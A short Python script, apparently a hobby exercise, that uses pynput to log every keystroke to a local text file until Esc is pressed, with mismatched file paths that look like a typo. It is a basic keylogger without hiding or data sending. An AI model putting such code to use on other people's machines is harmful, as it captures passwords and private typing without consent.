import os
from pynput.keyboard import Key, Listener

if not os.path.exists('/home/umang/python-scripts/test.txt'):
    os.mknod('/home/umang/python-scriptsr/test.txt')

file = open("test.txt", "w")


def on_press(key):
    print('{0} pressed'.format(key))
    if key == Key.space:
        file.write(" ")
    elif key == Key.backspace:
        file.write("")
    elif key == Key.esc:
        file.close()
    else:
        file.write(str(key))


def on_release(key):
    if key == Key.esc:
        file.close()
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
